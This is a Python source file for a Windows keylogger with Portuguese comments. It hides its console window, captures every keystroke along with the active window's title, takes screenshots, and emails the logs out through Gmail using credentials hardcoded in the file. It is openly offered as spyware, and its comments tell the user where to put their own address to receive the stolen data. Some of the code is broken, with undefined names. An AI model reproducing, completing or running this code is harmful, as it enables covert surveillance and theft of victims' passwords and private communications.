# -*- coding: utf-8 -*-

# codiname:
"""
    ▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄ 
  ▄█░░░░▌    ▐░░░░░░░░░░░▌  ▄█░░░░▌    ▐░░░░░░░░░░░▌
 ▐░░▌▐░░▌    ▐░█▀▀▀▀▀▀▀▀▀  ▐░░▌▐░░▌    ▐░█▀▀▀▀▀▀▀▀▀ 
  ▀▀ ▐░░▌    ▐░▌            ▀▀ ▐░░▌    ▐░▌          
     ▐░░▌    ▐░█▄▄▄▄▄▄▄▄▄      ▐░░▌    ▐░█▄▄▄▄▄▄▄▄▄ 
     ▐░░▌    ▐░░░░░░░░░░░▌     ▐░░▌    ▐░░░░░░░░░░░▌
     ▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌     ▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌
     ▐░░▌    ▐░▌       ▐░▌     ▐░░▌    ▐░▌       ▐░▌
 ▄▄▄▄█░░█▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░░█▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
"""


import win32api
import win32console
import win32gui
import pythoncom, pyHook
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime, time
import win32event, win32api, winerror
import random
import string

global t, start_time, nome_print, gmail, gmailpass, enviar, interval

t = ''
data = ''
x = ''
count = 0
nome_print = []
start_time = time.time()

#Destino dos logs
gmail = 'jakoritarl@gmail.com'		#Seu email
gmailpass = '*JAKL2002*'			#A senha do seu email
enviar = 'kpbplpsjubs@gmail.com'	#Um email qualquer para receber os logs
interval = 60

#Desabilitanto multipla instancia
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
	mutex = None
	exit(0)

#Esconder terminal
def Hide():
	win = win32console.GetConsoleWindow()
	win32gui.ShowWindow(win, 0)

#Envia os dados para o email
def enviarEmail(data, nome_print):
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(gmail, gmailpass)
	server.sendmail(gmail, enviar, data)
	server.close()

	for pic in nome_print:
		data = open(pic, 'r+').read()
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		server.login(gmail, gmailpass)
		server.sendmail(gmail, enviar, msg.as_string(data))
		server.close()

#Tirar print da tela
def printScreen():
	global nome_print
	try:
		import pyautogui

	except:
		usr = getpass.getuser()

		#Para Windows
		if(os.path.isdir("E:\\")):
			os.system("py -2 -m pip install pyautogui")
		
		elif(os.path.isdir("C:\\")):
			os.system("py -2 -m pip install pyautogui")

		#Para Linux
		elif(os.path.isdir("/home/"+usr+"/")):
			os.system("sudo python2 -m pip install pyautogui")
		
	def gerar_nome():
		return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

	nome = str(gerar_nome())
	nome_print.append(nome)
	pyautogui.screenshot().save(nome + '.png')

def keypressed(event):
	global t, gmail, gmailpass, enviar, interval, start_time, nome_print

	janela = event.WindowName
	keyp = event.Key
	
	data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
    + '\n' + ' Janela : ' + str(janela)
	data += '\n\tTecla :' + str(keyp)

	t = t + data

	if len(t) > 300:
		printScreen()

	if len(t) > 500:
		f = open('.Logfile.txt', 'w')
		f.write(keyp)
		f.close()

	if int(time.time() - start_time) == int(interval):
		enviarEmail(t, nome_print)
		t = ''

	return True

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
